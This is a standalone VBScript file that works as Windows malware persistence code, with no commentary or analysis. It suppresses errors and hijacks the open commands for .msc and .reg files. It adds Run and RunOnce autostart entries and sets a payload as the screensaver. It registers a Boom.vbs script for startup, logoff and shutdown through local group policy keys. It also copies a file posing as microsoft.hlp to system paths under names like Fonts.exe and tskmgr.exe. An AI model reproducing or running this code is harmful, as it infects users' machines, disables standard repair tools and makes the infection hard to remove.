dim fs,rg
set fs = createobject("scripting.filesystemobject")
set rg = createobject("wscript.shell")
on error resume next
rg.regwrite "HKCR\.vbs\", "VBSFile"
rg.regwrite "HKCU\Control Panel\Desktop\SCRNSAVE.EXE", " C:\WINDOWS\pchealth\helpctr\binaries\HelpHost.com"
rg.regwrite "HKCU\Control Panel\Desktop\ScreenSaveTimeOut", "30"
rg.regwrite "HKCR\MSCFile\Shell\Open\Command\", "C:\WINDOWS\pchealth\Global.exe"
rg.regwrite "HKCR\regfile\Shell\Open\Command\", "C:\WINDOWS\pchealth\Global.exe"
rg.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\", "C:\WINDOWS\system32\dllcache\Default.exe"
rg.regwrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\", "C:\WINDOWS\system32\dllcache\Default.exe"
rg.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", "C:\WINDOWS\system\KEYBOARD.exe"
rg.regwrite "HKEY_CLASSES_ROOT\MSCFile\Shell\Open\Command\", "C:\WINDOWS\Fonts\Fonts.exe"

rg.regwrite "HKCU\Software\Policies\Microsoft\Windows\System\Scripts\Logoff\0\DisplayName","Local Group Policy"
rg.regwrite "HKCU\Software\Policies\Microsoft\Windows\System\Scripts\Logoff\0\FileSysPath",""
rg.regwrite "HKCU\Software\Policies\Microsoft\Windows\System\Scripts\Logoff\0\GPO-ID","LocalGPO"
rg.regwrite "HKCU\Software\Policies\Microsoft\Windows\System\Scripts\Logoff\0\GPOName","Local Group Policy" 
rg.regwrite "HKCU\Software\Policies\Microsoft\Windows\System\Scripts\Logoff\0\SOM-ID","Local" 
rg.regwrite "HKCU\Software\Policies\Microsoft\Windows\System\Scripts\Logoff\0\0\Parameters",""
rg.regwrite "HKCU\Software\Policies\Microsoft\Windows\System\Scripts\Logoff\0\0\Script","C:\WINDOWS\Cursors\Boom.vbs"

rg.regwrite "HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Shutdown\0\DisplayName", "Local Group Policy"
rg.regwrite "HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Shutdown\0\FileSysPath", ""
rg.regwrite "HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Shutdown\0\GPO-ID", "LocalGPO"
rg.regwrite "HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Shutdown\0\GPOName", "Local Group Policy"
rg.regwrite "HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Shutdown\0\SOM-ID", "Local"
rg.regwrite "HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Shutdown\0\0\Parameters", ""
rg.regwrite "HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Shutdown\0\0\Script", "C:\WINDOWS\Cursors\Boom.vbs"

rg.regwrite "HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Startup\0\DisplayName", "Local Group Policy"
rg.regwrite "HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Startup\0\FileSysPath", ""
rg.regwrite "HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Startup\0\GPO-ID", "LocalGPO"
rg.regwrite "HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Startup\0\GPOName", "Local Group Policy"
rg.regwrite "HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Startup\0\SOM-ID", "Local"
rg.regwrite "HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Startup\0\0\Parameters", ""
rg.regwrite "HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Startup\0\0\Script", "C:\WINDOWS\Cursors\Boom.vbs"

If Not fs.fileexists("C:\WINDOWS\Fonts\Fonts.exe") Then fs.copyfile ("C:\WINDOWS\Help\microsoft.hlp"), ("C:\WINDOWS\Fonts\Fonts.exe")
If Not fs.fileexists("C:\WINDOWS\pchealth\helpctr\binaries\HelpHost.com") Then fs.copyfile ("C:\WINDOWS\Help\microsoft.hlp"), ("C:\WINDOWS\pchealth\helpctr\binaries\HelpHost.com")
If Not fs.fileexists("C:\WINDOWS\pchealth\Global.exe") Then fs.copyfile ("C:\WINDOWS\Help\microsoft.hlp"), ("C:\WINDOWS\pchealth\Global.exe")
If Not fs.fileexists("C:\WINDOWS\system\KEYBOARD.exe") Then fs.copyfile ("C:\WINDOWS\Help\microsoft.hlp"), ("C:\WINDOWS\system\KEYBOARD.exe")
If Not fs.fileexists("C:\WINDOWS\system32\dllcache\Default.exe") Then fs.copyfile ("C:\WINDOWS\Help\microsoft.hlp"), ("C:\WINDOWS\system32\dllcache\Default.exe")
If Not fs.fileexists("C:\windows\system32\drivers\drivers.cab.exe") Then fs.copyfile ("C:\WINDOWS\Help\microsoft.hlp"), ("C:\windows\system32\drivers\drivers.cab.exe ")
If Not fs.fileexists("C:\windows\media\rndll32.pif ") Then fs.copyfile ("C:\WINDOWS\Help\microsoft.hlp"), ("C:\windows\media\rndll32.pif")
If Not fs.fileexists("C:\windows\fonts\tskmgr.exe") Then fs.copyfile ("C:\WINDOWS\Help\microsoft.hlp"), ("C:\windows\fonts\tskmgr.exe")
